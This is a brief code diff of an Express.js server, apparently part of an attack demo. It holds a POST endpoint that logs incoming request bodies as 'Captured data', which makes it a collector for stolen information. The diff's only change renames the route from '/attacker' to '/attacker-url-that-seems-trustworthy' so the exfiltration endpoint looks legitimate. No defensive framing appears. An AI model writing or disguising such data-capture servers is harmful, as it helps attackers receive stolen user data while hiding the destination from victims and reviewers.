@@ -11,7 +11,7 @@ app.use((req, res, next) => {
 
 app.use(express.json());
 
-app.post('/attacker', (req, res) => {
+app.post('/attacker-url-that-seems-trustworthy', (req, res) => {
     console.log('Captured data:', req.body);
     res.sendStatus(200);
 });
